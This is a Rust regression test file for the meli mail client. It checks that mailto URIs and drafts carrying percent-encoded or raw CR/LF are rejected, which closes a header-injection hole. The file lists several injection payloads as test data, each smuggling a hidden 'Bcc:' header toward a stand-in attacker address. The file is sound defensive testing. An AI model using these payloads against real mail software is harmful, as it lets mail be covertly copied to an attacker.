//
// meli
//
// Copyright 2026 Kyle Lee
//
// This file is part of meli.
//
// meli is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// meli is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with meli.  If not, see <http://www.gnu.org/licenses/>.
//
// SPDX-License-Identifier: EUPL-1.2 OR GPL-3.0-or-later

//! C2 regression: mailto CRLF header injection (CWE-93).
//!
//! Historical PoC (pre-fix proof): `mailto:victim@example.com?subject=hi%0d%
//! 0aBcc:attacker@evil.example` percent-decoded into a header value
//! containing raw CRLF which `Draft::finalise()` wrote out verbatim as
//! `{k}: {v}\r\n`, splitting the injected Bcc into its own header line;
//! re-parsing the outgoing message (as SMTP submission does for RCPT)
//! yielded `bcc = [attacker@evil.example]`.
//!
//! Fixed behavior pinned here:
//! - the mailto parser rejects percent-encoded CR/LF in any hfield value
//!   (and in the address part);
//! - `Draft::finalise()` is the single chokepoint that hard-errors on any
//!   CR/LF in a header value that is not valid RFC5322 folding whitespace;
//! - legitimate input (folds, mailto bodies with line breaks, clean drafts)
//!   is unchanged.

use melib::email::{mailto::Mailto, Draft, Envelope, HeaderName};

#[test]
fn mailto_percent_encoded_crlf_in_header_values_is_rejected() {
    // RFC6068 forbids CR/LF in hfield values; percent-escapes in any case
    // combination must be rejected instead of decoded into header values.
    for uri in [
        "mailto:victim@example.com?subject=hi%0d%0aBcc:attacker@evil.example",
        "mailto:victim@example.com?subject=hi%0D%0ABcc:attacker@evil.example",
        "mailto:victim@example.com?subject=hi%0d%0ABcc:attacker@evil.example",
        "mailto:victim@example.com?subject=hi%0aBcc:attacker@evil.example",
        "mailto:victim@example.com?subject=hi%0dBcc:attacker@evil.example",
        "mailto:victim@example.com?subject=hi%0d%0aBcc: attacker@evil.example",
        "mailto:victim@example.com?cc=cc%0d%0aBcc:attacker@evil.example",
        "mailto:victim@example.com?In-Reply-To=%3Ca%40b.example%3E%0d%0aBcc:attacker@evil.example",
    ] {
        assert!(
            Mailto::try_from(uri).is_err(),
            "mailto URI with percent-encoded CR/LF in a header value must be \
             rejected: {uri}"
        );
    }
}

#[test]
fn mailto_percent_encoded_crlf_in_address_part_is_rejected() {
    // CRLF smuggled through a quoted display name in the address part must
    // also be rejected before it can reach the To: header value.
    let uri = "mailto:%22X%0d%0aBcc=3Aattacker=40evil=2Eexample%22%20%3Cvictim@example.com%3E";
    assert!(
        Mailto::try_from(uri).is_err(),
        "mailto URI with percent-encoded CR/LF in the address part must be rejected"
    );
}

#[test]
fn mailto_legitimate_uris_still_parse() {
    // Positive control: clean header values are unaffected.
    let mailto = Mailto::try_from("mailto:info@example.com?subject=email%20subject")
        .expect("legitimate mailto must parse");
    assert_eq!(&mailto.headers[&HeaderName::SUBJECT], "email subject");

    // RFC6068 §5 explicitly allows line breaks in the `body` hfield encoded
    // as %0D%0A; they must NOT be rejected.
    let mailto =
        Mailto::try_from("mailto:infobot@example.com?body=send%20current-issue%0D%0Asend%20index")
            .expect("mailto with %0D%0A in body must parse");
    assert_eq!(
        mailto.body.as_deref(),
        Some("send current-issue\r\nsend index")
    );
    let mailto = Mailto::try_from(
        "mailto:info@example.com?bcc=7bcc8@example.com&body=line%20first%0Abut%20not%0Alast",
    )
    .expect("mailto with %0A in body must parse");
    assert_eq!(mailto.body.as_deref(), Some("line first\nbut not\nlast"));
}

#[test]
fn finalise_rejects_crlf_in_header_values_loudly() {
    // Chokepoint: whatever route stores a CR/LF-bearing header value in a
    // Draft (UI code, future regressions in mailto/upgrade paths),
    // `Draft::finalise()` must loudly refuse to produce message bytes.
    for bad_subject in [
        "hi\r\nBcc:attacker@evil.example",
        "hi\r\nBcc: attacker@evil.example",
        "hi\nBcc:attacker@evil.example",
        "hi\rBcc:attacker@evil.example",
        "trailing newline\r\n",
    ] {
        let mut draft = Draft::default();
        draft
            .set_header(HeaderName::FROM, "victim@example.com".to_string())
            .set_header(HeaderName::SUBJECT, bad_subject.to_string());
        let err = draft
            .finalise()
            .err()
            .unwrap_or_else(|| panic!("finalise must reject {bad_subject:?}"));
        assert!(
            err.to_string().contains("CR/LF"),
            "error must mention CR/LF: {err}"
        );
    }
}

#[test]
fn finalise_rejects_crlf_in_any_header_not_just_subject() {
    for (header, value) in [
        (HeaderName::TO, "a@b.example\r\nBcc:attacker@evil.example"),
        (HeaderName::CC, "a@b.example\r\nBcc:attacker@evil.example"),
        (
            HeaderName::IN_REPLY_TO,
            "<m1@x.example>\r\nBcc:attacker@evil.example",
        ),
    ] {
        let mut draft = Draft::default();
        draft.set_header(header.clone(), value.to_string());
        assert!(
            draft.finalise().is_err(),
            "finalise must reject CR/LF in {header} value"
        );
    }
}

#[test]
fn finalise_preserves_legitimate_folded_headers() {
    // Adversarial class: folded headers (CRLF/LF followed by WSP) are
    // legitimate RFC5322 folding; they must finalise unchanged and re-parse
    // as the same single header (no new header line, no injection).
    for folded in ["line1\r\n line2", "line1\n line2", "line1\r\n\tline2"] {
        let mut draft = Draft::default();
        draft.set_header(HeaderName::SUBJECT, folded.to_string());
        let raw = draft
            .finalise()
            .unwrap_or_else(|err| panic!("legitimate fold {folded:?} must finalise: {err}"));
        assert!(
            raw.contains(&format!("Subject: {folded}\r\n")),
            "fold must be preserved verbatim in {raw:?}"
        );
        assert!(
            !raw.contains("\r\nBcc:attacker"),
            "folds must not be able to smuggle a new header line: {raw:?}"
        );
        Envelope::from_bytes(raw.as_bytes(), None)
            .unwrap_or_else(|err| panic!("finalised message with fold must re-parse: {err}"));
    }
}

#[test]
fn positive_control_legitimate_draft_finalises_unchanged() {
    // Behavior freeze: a fully legitimate draft (fixed Date, empty From so no
    // random Message-ID is generated, quoted ASCII display name) finalises
    // byte-identical to pre-fix behavior.
    let mut draft = Draft::default();
    draft
        .set_header(
            HeaderName::DATE,
            "Sun, 16 Jun 2013 17:56:45 +0200".to_string(),
        )
        .set_header(
            HeaderName::TO,
            "\"Danny B. Orr\" <orrange@example.com>".to_string(),
        )
        .set_header(HeaderName::SUBJECT, "test freeze".to_string());
    draft.set_body("hello".to_string());
    let raw = draft.finalise().expect("legitimate draft must finalise");
    assert_eq!(
        raw,
        "Date: Sun, 16 Jun 2013 17:56:45 +0200\r\n\
         From: \r\n\
         To: \"Danny B. Orr\" <orrange@example.com>\r\n\
         Cc: \r\n\
         Bcc: \r\n\
         Subject: test freeze\r\n\
         MIME-Version: 1.0\r\n\
         Content-Type: text/plain; charset=\"utf-8\"\r\n\
         Content-Transfer-Encoding: 8bit\r\n\
         \r\n\
         hello\r\n"
    );
}

#[test]
fn poc_c2_mailto_ignore_headers_does_not_cover_bcc() {
    // Documented falsification attempt: Bcc/Cc/Reply-To/In-Reply-To are absent
    // from Mailto::IGNORE_HEADERS (mailto.rs), so a *plain* (non-CRLF) bcc=
    // hfield in a mailto URI is a legitimate RFC6068 feature the compose UI
    // shows to the user; it is NOT the injection channel. The injection
    // channel (percent-encoded CR/LF) is rejected by the tests above and the
    // finalise() chokepoint.
    for h in [HeaderName::BCC, HeaderName::CC] {
        assert!(
            !Mailto::IGNORE_HEADERS.contains(&h),
            "{h:?} must not be ignored"
        );
    }
    assert!(Mailto::IGNORE_HEADERS.contains(&HeaderName::FROM));
}
